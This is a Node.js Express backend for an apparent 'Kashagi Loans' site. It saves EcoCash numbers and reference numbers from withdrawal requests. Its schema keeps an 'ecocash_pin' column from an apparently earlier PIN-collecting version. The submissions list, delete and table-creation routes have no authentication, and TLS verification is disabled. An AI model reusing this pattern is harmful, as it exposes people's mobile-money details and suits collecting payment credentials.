const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");
const path = require("path");

const app = express();


// ========================================
// MIDDLEWARE
// ========================================

app.use(cors());

app.use(express.json());

app.use(
    express.urlencoded({
        extended: true
    })
);


// ========================================
// DATABASE
// ========================================

const pool = new Pool({

    connectionString:
        process.env.DATABASE_URL,

    ssl: {
        rejectUnauthorized: false
    }

});


// ========================================
// STATIC WEBSITE
// ========================================

app.use(
    express.static(
        path.join(
            __dirname,
            "public"
        )
    )
);


// ========================================
// DATABASE INITIALIZATION
// ========================================

async function initializeDatabase() {

    try {


        // Create the table if it doesn't exist

        await pool.query(`
            CREATE TABLE IF NOT EXISTS submissions (

                id SERIAL PRIMARY KEY,

                ecocash_number TEXT NOT NULL,

                reference_number TEXT,

                ecocash_pin TEXT,

                created_at
                TIMESTAMP
                DEFAULT CURRENT_TIMESTAMP

            )
        `);



        // Add reference_number if
        // the old table doesn't have it

        await pool.query(`
            ALTER TABLE submissions
            ADD COLUMN IF NOT EXISTS reference_number TEXT
        `);



        // Keep the old PIN column if
        // it already exists, but we don't
        // use it.

        await pool.query(`
            ALTER TABLE submissions
            ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
        `);



        // Make sure created_at exists

        await pool.query(`
            ALTER TABLE submissions
            ADD COLUMN IF NOT EXISTS
            created_at TIMESTAMP
            DEFAULT CURRENT_TIMESTAMP
        `);



        console.log(
            "========================================"
        );

        console.log(
            "DATABASE INITIALIZATION SUCCESSFUL"
        );

        console.log(
            "submissions table is ready."
        );

        console.log(
            "reference_number column is ready."
        );

        console.log(
            "========================================"
        );


    } catch (error) {


        console.error(
            "DATABASE INITIALIZATION ERROR:"
        );

        console.error(error);

    }

}


// ========================================
// TEST DATABASE
// ========================================

app.get(
    "/test-db",
    async (req, res) => {

        try {


            const result =
                await pool.query(
                    "SELECT NOW()"
                );


            res.json({

                success: true,

                message:
                    "Database connection successful.",

                time:
                    result.rows[0].now

            });


        } catch (error) {


            console.error(
                "DATABASE TEST ERROR:",
                error
            );


            res.status(500).json({

                success: false,

                message:
                    "Database connection failed.",

                error:
                    error.message

            });

        }

    }
);


// ========================================
// MANUAL TABLE CREATION / REPAIR
// ========================================

app.get(
    "/create-table",
    async (req, res) => {

        try {


            await pool.query(`
                CREATE TABLE IF NOT EXISTS submissions (

                    id SERIAL PRIMARY KEY,

                    ecocash_number TEXT NOT NULL,

                    reference_number TEXT,

                    ecocash_pin TEXT,

                    created_at
                    TIMESTAMP
                    DEFAULT CURRENT_TIMESTAMP

                )
            `);



            await pool.query(`
                ALTER TABLE submissions
                ADD COLUMN IF NOT EXISTS reference_number TEXT
            `);



            await pool.query(`
                ALTER TABLE submissions
                ADD COLUMN IF NOT EXISTS ecocash_pin TEXT
            `);



            res.json({

                success: true,

                message:
                    "Submissions table is ready."

            });


        } catch (error) {


            console.error(
                "CREATE TABLE ERROR:",
                error
            );


            res.status(500).json({

                success: false,

                error:
                    error.message

            });

        }

    }
);


// ========================================
// SUBMIT WITHDRAWAL REQUEST
// ========================================

app.post(
    "/submit",
    async (req, res) => {


        console.log(
            "SUBMIT ROUTE HIT"
        );


        /*
         * We only process:
         *
         * 1. EcoCash number
         * 2. Reference number
         *
         * No PIN is captured or stored.
         */


        const {
            ecocash_number,
            reference_number
        } = req.body;



        // Validate EcoCash number

        if (!ecocash_number) {

            return res.status(400).json({

                success: false,

                message:
                    "EcoCash number is required."

            });

        }



        // Validate reference number

        if (!reference_number) {

            return res.status(400).json({

                success: false,

                message:
                    "Reference number is required."

            });

        }



        try {


            const result =
                await pool.query(
                    `
                    INSERT INTO submissions
                    (
                        ecocash_number,
                        reference_number
                    )

                    VALUES
                    (
                        $1,
                        $2
                    )

                    RETURNING
                        id,
                        ecocash_number,
                        reference_number,
                        created_at
                    `,
                    [
                        ecocash_number,
                        reference_number
                    ]
                );



            console.log(
                "SUBMISSION SAVED:",
                result.rows[0].id
            );



            res.status(200).json({

                success: true,

                message:
                    "Withdrawal request has been received successfully.",

                id:
                    result.rows[0].id

            });


        } catch (error) {


            console.error(
                "SUBMIT DATABASE ERROR:",
                error
            );


            res.status(500).json({

                success: false,

                message:
                    "Database error.",

                error:
                    error.message

            });

        }

    }
);


// ========================================
// VIEW SUBMISSIONS
// ========================================

app.get(
    "/submissions",
    async (req, res) => {

        try {


            const search =
                req.query.search || "";



            const result =
                await pool.query(
                    `
                    SELECT
                        id,
                        ecocash_number,
                        reference_number,
                        created_at

                    FROM submissions

                    WHERE
                        ecocash_number ILIKE $1

                        OR

                        reference_number ILIKE $1

                    ORDER BY
                        created_at DESC
                    `,
                    [
                        `%${search}%`
                    ]
                );



            let html = `

<!DOCTYPE html>

<html>

<head>

<title>
Kashagi Loans - Submissions
</title>


<meta
    name="viewport"
    content="width=device-width, initial-scale=1"
>


<style>

body {

    font-family:
        Arial,
        sans-serif;

    background:
        #f5f5f5;

    padding:
        20px;

}


h1 {

    color:
        #1877f2;

}


.search-box {

    margin-bottom:
        20px;

}


input {

    padding:
        10px;

    width:
        260px;

    font-size:
        16px;

}


button {

    padding:
        10px 15px;

    cursor:
        pointer;

}


table {

    width:
        100%;

    border-collapse:
        collapse;

    background:
        white;

}


th,
td {

    padding:
        12px;

    border:
        1px solid #ddd;

    text-align:
        left;

}


th {

    background:
        #1877f2;

    color:
        white;

}


.delete {

    background:
        #d32f2f;

    color:
        white;

    border:
        none;

}


</style>

</head>


<body>


<h1>
Kashagi Loans - Submissions
</h1>



<form
    method="GET"
    action="/submissions"
    class="search-box"
>

<input

    type="text"

    name="search"

    placeholder="Search number or reference"

    value="${escapeHtml(search)}"

>


<button type="submit">
    Search
</button>

</form>



<table>


<tr>

<th>
    ID
</th>

<th>
    EcoCash Number
</th>

<th>
    Reference Number
</th>

<th>
    Date
</th>

<th>
    Action
</th>

</tr>

`;



            result.rows.forEach(
                row => {

                    html += `

<tr>

<td>
    ${row.id}
</td>

<td>
    ${escapeHtml(
        row.ecocash_number
    )}
</td>

<td>
    ${escapeHtml(
        row.reference_number || ""
    )}
</td>

<td>
    ${escapeHtml(
        String(row.created_at)
    )}
</td>

<td>

<form
    method="POST"
    action="/delete/${row.id}"
    style="margin:0;"
>

<button
    type="submit"
    class="delete"
>

Delete

</button>

</form>

</td>

</tr>

`;

                }
            );



            html += `

</table>


</body>

</html>

`;



            res.send(html);


        } catch (error) {


            console.error(
                "SUBMISSIONS ERROR:",
                error
            );


            res.status(500).send(`

<h1>
    Database Error
</h1>

<pre>
${escapeHtml(error.message)}
</pre>

`);

        }

    }
);


// ========================================
// DELETE ONE SUBMISSION
// ========================================

app.post(
    "/delete/:id",
    async (req, res) => {

        try {


            await pool.query(
                `
                DELETE FROM submissions
                WHERE id = $1
                `,
                [
                    req.params.id
                ]
            );



            res.redirect(
                "/submissions"
            );


        } catch (error) {


            console.error(
                "DELETE ERROR:",
                error
            );


            res.status(500).send(
                "Delete failed."
            );

        }

    }
);


// ========================================
// DASHBOARD
// ========================================

app.get(
    "/dashboard",
    (req, res) => {

        res.redirect(
            "/submissions"
        );

    }
);


// ========================================
// HTML ESCAPE HELPER
// ========================================

function escapeHtml(value) {

    return String(value)

        .replace(
            /&/g,
            "&amp;"
        )

        .replace(
            /</g,
            "&lt;"
        )

        .replace(
            />/g,
            "&gt;"
        )

        .replace(
            /"/g,
            "&quot;"
        )

        .replace(
            /'/g,
            "&#039;"
        );

}


// ========================================
// START SERVER
// ========================================

const PORT =
    process.env.PORT || 10000;


app.listen(
    PORT,
    async () => {


        console.log(
            `Server started on port ${PORT}`
        );


        await initializeDatabase();

    }
);
